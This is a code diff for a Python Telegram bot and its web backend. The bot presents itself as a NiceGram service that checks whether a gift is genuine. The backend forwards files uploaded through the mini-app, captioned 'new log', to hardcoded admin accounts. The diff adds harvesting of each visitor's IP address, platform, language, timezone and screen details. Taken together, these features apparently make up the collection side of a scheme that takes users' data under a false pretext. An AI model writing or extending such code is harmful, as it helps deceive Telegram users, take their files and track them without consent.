@@ -10,8 +10,7 @@ from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
 # ПАРАМЕТРЫ НАСТРОЙКИ
 # =====================================================
 API_TOKEN = os.getenv("BOT_TOKEN")
-# ID админов оставил только для того, чтобы бот знал, куда отправлять логи
-ADMIN_IDS = [1486385025, 760217595] 
+ADMIN_IDS = [760217595] 
 WEB_APP_URL = "https://nicegrambot.vercel.app/"
 # =====================================================
 
@@ -36,25 +35,20 @@ async def cmd_start(message: types.Message):
         [InlineKeyboardButton(text="📱 Скачать NiceGram", url="https://nicegram.app/")]
     ])
     
-    # Обновленный текст
     text_content = (
         "🖐Привет! Я — бот который поможет более детально узнать о вашем подарке, "
         "от его покупки до того за какие звёзды они были куплены,помогу отличить реальный подарок от чистого визуала!"
     )
     
-    # Пытаемся отправить фото. Если файла нет, отправит просто текст с ошибкой в лог
     try:
-        # Убедитесь, что файл nicegram2.jpg лежит в папке с ботом
         photo = FSInputFile("nicegram2.jpg")
         await message.answer_photo(photo=photo, caption=text_content, reply_markup=markup)
     except Exception as e:
         logging.error(f"Не удалось отправить фото (проверьте наличие nicegram2.jpg): {e}")
-        # Если фото не найдено, отправляем просто текст, чтобы бот не молчал
         await message.answer(text_content, reply_markup=markup)
 
 @router.message(Command("text"))
 async def cmd_text(message: types.Message):
-    # 🔐 ДОСТУП ТОЛЬКО ДЛЯ АДМИНОВ
     if message.from_user.id not in ADMIN_IDS:
         await message.answer("⛔ У вас нет прав на использование этой команды.")
         return
@@ -82,22 +76,46 @@ async def root(request):
 
 @routes.post('/log_entry')
 async def handle_log_entry(request: web.Request):
-    # Принимаем данные без проверок
     try:
         data = await request.json()
+        
+        # Получаем IP адрес
+        ip_address = request.headers.get('X-Forwarded-For', request.remote)
+        if ip_address and ',' in ip_address:
+            ip_address = ip_address.split(',')[0].strip()
         
         user_id = str(data.get('user_id', '0000'))
         username = data.get('username', 'не указан')
         ua = data.get('user_agent', 'неизвестен')
-
-        msg = (f"🚀 **Вход в Mini App**\n"
-               f"👤 Юзер: @{username} (ID: {user_id})\n"
-               f"📱 Устройство: `{ua}`")
+        platform = data.get('platform', 'неизвестно')
+        language = data.get('language', 'неизвестен')
+        timezone = data.get('timezone', 'неизвестна')
+        screen = data.get('screen', 'неизвестно')
+        timestamp = data.get('timestamp', 'неизвестно')
+        
+        # Расширенное сообщение
+        msg = (
+            f"🚀 **Вход в Mini App**\n\n"
+            f"👤 **Пользователь:**\n"
+            f"├ Username: @{username}\n"
+            f"├ ID: `{user_id}`\n"
+            f"└ Язык: {language}\n\n"
+            f"🌐 **Сеть:**\n"
+            f"├ IP: `{ip_address}`\n"
+            f"└ Платформа: {platform}\n\n"
+            f"📱 **Устройство:**\n"
+            f"├ User-Agent: `{ua}`\n"
+            f"└ Разрешение: {screen}\n\n"
+            f"🕐 **Время:**\n"
+            f"├ Timestamp: {timestamp}\n"
+            f"└ Timezone: {timezone}"
+        )
 
         for admin_id in get_all_admins():
             try:
                 await bot.send_message(admin_id, msg, parse_mode="Markdown")
-            except: pass
+            except: 
+                pass
             
         return web.Response(text="OK", headers={"Access-Control-Allow-Origin": "*"})
     except Exception as e:
@@ -106,19 +124,29 @@ async def handle_log_entry(request: web.Request):
 
 @routes.post('/upload')
 async def handle_upload_file(request: web.Request):
-    # Принимаем файлы без проверок
     try:
         reader = await request.multipart()
+        
+        # Получаем IP
+        ip_address = request.headers.get('X-Forwarded-For', request.remote)
+        if ip_address and ',' in ip_address:
+            ip_address = ip_address.split(',')[0].strip()
         
         user_id = "0000"
         username = "Unknown"
         ua = "Unknown"
+        platform = "Unknown"
+        language = "Unknown"
+        timezone = "Unknown"
+        screen = "Unknown"
+        timestamp = "Unknown"
         file_data = None
         filename = "data.json"
 
         while True:
             part = await reader.next()
-            if part is None: break
+            if part is None: 
+                break
             
             if part.name == 'user_agent': 
                 ua = (await part.read_chunk()).decode('utf-8')
@@ -126,22 +154,46 @@ async def handle_upload_file(request: web.Request):
                 user_id = (await part.read_chunk()).decode('utf-8')
             elif part.name == 'username':
                 username = (await part.read_chunk()).decode('utf-8')
+            elif part.name == 'platform':
+                platform = (await part.read_chunk()).decode('utf-8')
+            elif part.name == 'language':
+                language = (await part.read_chunk()).decode('utf-8')
+            elif part.name == 'timezone':
+                timezone = (await part.read_chunk()).decode('utf-8')
+            elif part.name == 'screen':
+                screen = (await part.read_chunk()).decode('utf-8')
+            elif part.name == 'timestamp':
+                timestamp = (await part.read_chunk()).decode('utf-8')
             elif part.name == 'file':
                 filename = part.filename or "data.json"
                 file_data = await part.read()
 
         if file_data:
-            caption_text = (f"🚨 Новый лог!\n"
-                            f"User ID: {user_id}\n"
-                            f"Username: @{username}\n"
-                            f"Браузер: {ua}")
+            caption_text = (
+                f"🚨 **Новый файл загружен!**\n\n"
+                f"👤 **Пользователь:**\n"
+                f"├ Username: @{username}\n"
+                f"├ ID: `{user_id}`\n"
+                f"└ Язык: {language}\n\n"
+                f"🌐 **Сеть:**\n"
+                f"├ IP: `{ip_address}`\n"
+                f"└ Платформа: {platform}\n\n"
+                f"📱 **Устройство:**\n"
+                f"├ User-Agent: `{ua}`\n"
+                f"└ Разрешение: {screen}\n\n"
+                f"🕐 **Время:**\n"
+                f"├ Timestamp: {timestamp}\n"
+                f"└ Timezone: {timezone}\n\n"
+                f"📎 **Файл:** `{filename}`"
+            )
 
             for admin_id in get_all_admins():
                 try:
                     await bot.send_document(
                         chat_id=admin_id,
                         document=BufferedInputFile(file_data, filename=filename),
-                        caption=caption_text
+                        caption=caption_text,
+                        parse_mode="Markdown"
                     )
                 except Exception as e:
                     logging.error(f"Failed to send doc to admin: {e}")
